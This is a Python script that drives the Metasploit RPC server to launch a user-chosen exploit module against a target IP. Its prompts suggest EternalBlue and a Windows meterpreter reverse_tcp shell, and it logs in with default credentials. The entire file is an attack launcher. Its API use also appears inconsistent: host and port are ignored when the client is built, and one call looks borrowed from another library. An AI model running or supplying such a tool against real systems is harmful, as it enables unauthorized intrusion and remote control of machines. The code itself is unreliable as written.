import msfrpc

class Exploitation:
    def __init__(self):
        self.client = None

    def connect_to_metasploit(self, host="127.0.0.1", port=55553, username="msf", password="msf"): 
        try:
            print(f"Connecting to Metasploit RPC server at {host}:{port}...")
            self.client = msfrpc.Msfrpc({})
            self.client.login(username, password)
            print("Connection successful!")
        except Exception as e:
            print(f"Failed to connect to Metasploit: {e}")

    def run_exploit(self, exploit_name, payload, target):
        try:
            if not self.client:
                raise Exception("Not connected to Metasploit. Call connect_to_metasploit() first.")

            print(f"Running exploit: {exploit_name} on target: {target}...")
            exploit = self.client.modules.use('exploit', exploit_name)
            exploit['RHOSTS'] = target

            if payload:
                exploit.execute(payload=payload)
            else:
                exploit.execute()

            print("Exploit executed successfully!")
        except Exception as e:
            print(f"Error during exploitation: {e}")

if __name__ == "__main__":
    exploit_tool = Exploitation()
    exploit_tool.connect_to_metasploit()
    exploit_name = input("Enter the name of the exploit module (e.g., exploit/windows/smb/ms17_010_eternalblue): ")
    payload = input("Enter the payload to use (e.g., windows/meterpreter/reverse_tcp) or leave blank for default: ")
    target = input("Enter the target IP address: ")

    exploit_tool.run_exploit(exploit_name, payload, target)
